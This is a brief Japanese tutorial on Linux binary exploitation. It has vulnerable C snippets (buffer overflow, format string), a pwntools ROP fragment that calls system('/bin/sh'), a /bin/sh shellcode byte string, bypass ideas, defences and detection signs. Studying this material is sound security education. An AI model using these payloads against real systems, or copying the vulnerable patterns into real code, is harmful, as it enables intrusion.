# Binary Exploitation Techniques

**対応OS**: Linux

## 概要
Linux環境でのバイナリエクスプロイテーション手法について解説します。

## 基本的な脆弱性

### バッファオーバーフロー
```c
// 脆弱なコード例
void vulnerable_function(char *input) {
    char buffer[64];
    strcpy(buffer, input);  // 境界チェックなし
}
```

### フォーマット文字列
```c
// 脆弱なコード例
void print_user_input(char *input) {
    printf(input);  // フォーマット文字列を直接使用
}
```

## 攻撃テクニック

### ROP (Return Oriented Programming)
```python
from pwn import *

# ROPチェーンの構築
rop = ROP(binary)
rop.call('system', ['/bin/sh'])

payload = flat(
    b'A' * offset,
    rop.chain()
)
```

### シェルコード実行
```python
# シェルコードの例
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
```

## 保護機構の回避

### ASLR回避
- リーク情報の利用
- 相対アドレスの使用
- ヒープスプレー

### Stack Canary回避
- リーク手法
- ブルートフォース
- Off-by-one活用

## 防御策
- ASLR有効化
- DEP/NX有効化
- Stack Canary使用
- PIE有効化
- RELRO有効化

## 検知方法
- 異常なメモリアクセス
- セグメンテーション違反
- 不正なシステムコール
- プロセスクラッシュ

## 注意事項
- このテクニックは教育目的でのみ使用してください
- 実環境での使用は法的責任を伴う可能性があります
- すべてのテストは許可された環境でのみ行ってください 